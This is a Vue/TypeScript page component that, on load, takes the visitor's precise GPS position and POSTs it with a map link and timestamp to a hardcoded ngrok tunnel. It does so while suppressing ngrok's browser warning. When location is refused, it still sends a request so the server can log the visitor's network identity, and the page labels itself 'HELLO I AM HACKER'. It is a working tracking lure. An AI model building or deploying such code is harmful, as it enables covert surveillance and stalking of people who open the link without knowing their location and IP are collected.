<script setup lang="ts">
import { ref, onMounted } from "vue";
import L from "leaflet";
import "leaflet/dist/leaflet.css";

const result = ref<any>(null);
const loading = ref(false);
let map: L.Map | null = null;
let marker: L.Marker | null = null;

// SERVER ENDPOINT URL
const SERVER_URL = "https://959e-183-182-110-242.ngrok-free.app/api/location";

// -------------------------
// INIT MAP
// -------------------------
const initMap = (lat: number, lon: number) => {
  try {
    const mapElement = document.getElementById("map");
    if (mapElement) {
      mapElement.style.visibility = "visible";
    }

    if (!map) {
      map = L.map("map").setView([lat, lon], 15);
      L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
        attribution: "© OpenStreetMap",
      }).addTo(map);
    } else {
      map.setView([lat, lon], 15);
    }
  } catch (err) {
    console.error("Leaflet initialization failed:", err);
  }
};

// -------------------------
// SET MARKER
// -------------------------
const setMarker = (lat: number, lon: number) => {
  if (!map) return;
  try {
    if (marker) {
      marker.remove();
    }
    marker = L.marker([lat, lon])
      .addTo(map)
      .bindPopup("📍 Your Current Location")
      .openPopup();
  } catch (err) {
    console.error("Marker plotting failed:", err);
  }
};

// Generate time payload matching Vientiane context
const time = new Intl.DateTimeFormat("en-US", {
  timeZone: "Asia/Vientiane",
  year: "2-digit",
  month: "2-digit",
  day: "2-digit",
  hour: "2-digit",
  minute: "2-digit",
  second: "2-digit",
  hour12: false,
}).format(new Date());

// -------------------------
// SEND DATA HELPER
// -------------------------
const sendTrackingPayload = async (lat: number | null, lon: number | null, mapLink: string | null) => {
  try {
    console.log("Sending network packet payload to server...", { lat, lon });
    
    const response = await fetch(SERVER_URL, {
      method: "POST", // Capitalized standard method declaration
      headers: {
        "ngrok-skip-browser-warning": "true",
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        lat,
        lon,
        mapLink,
        time,
      }),
    });

    const serverData = await response.json();
    console.log("Server responded successfully:", serverData);
  } catch (err) {
    console.error("Network Fetch Transmission Failed:", err);
  }
};

// -------------------------
// GET GPS LOCATION
// -------------------------
const getLocation = () => {
  loading.value = true;

  if (!navigator.geolocation) {
    console.warn("Browser environment blocks native geolocation.");
    sendTrackingPayload(null, null, null);
    loading.value = false;
    return;
  }

  navigator.geolocation.getCurrentPosition(
    async (position) => {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      
      // FIXED TEMPLATE STRING HOOKS HERE:
      const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;

      result.value = { lat, lon, mapLink };

      // Render UI map visuals smoothly
      initMap(lat, lon);
      setMarker(lat, lon);
      loading.value = false;

      // Dispatch tracking safely to backend
      await sendTrackingPayload(lat, lon, mapLink);
    },
    async (error) => {
      console.warn("GPS Permission Denied / Error Callback hit:", error.message);
      loading.value = false;

      // Fallback path sends empty telemetry coordinates so server extracts network identity safely
      await sendTrackingPayload(null, null, null);
    },
    {
      enableHighAccuracy: true,
      timeout: 7000, // Safe timeout so network response drops smoothly if calculation stalls
    },
  );
};

onMounted(() => {
  getLocation();
});
</script>

<template>
  <div v-if="loading" class="loading">
    <div class="spinner"></div>
    <span>WAITING...</span>
  </div>
  
  <div class="container">
    <div v-if="result" class="info">
      <a :href="result.mapLink" target="_blank" rel="noopener noreferrer">
        HELLO I AM HACKER
      </a>
    </div>

    <div id="map" class="map"></div>
  </div>
</template>
<style scoped>
.container {
  padding: 20px;
}

.info {
  margin-top: 20px;
}

#map {
  visibility: hidden; /* Stays hidden unless explicitly triggered by structural success mapping */
}

.map {
  height: 450px;
  width: 100%;
  margin-top: 20px;
  border-radius: 10px;
  overflow: hidden;
}

.loading {
  position: fixed;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  background: rgba(255, 255, 255, 0.8);
  z-index: 9999;
}

.spinner {
  width: 40px;
  height: 40px;
  border: 4px solid #ddd;
  border-top-color: #2563eb;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
  margin-bottom: 10px;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}
</style>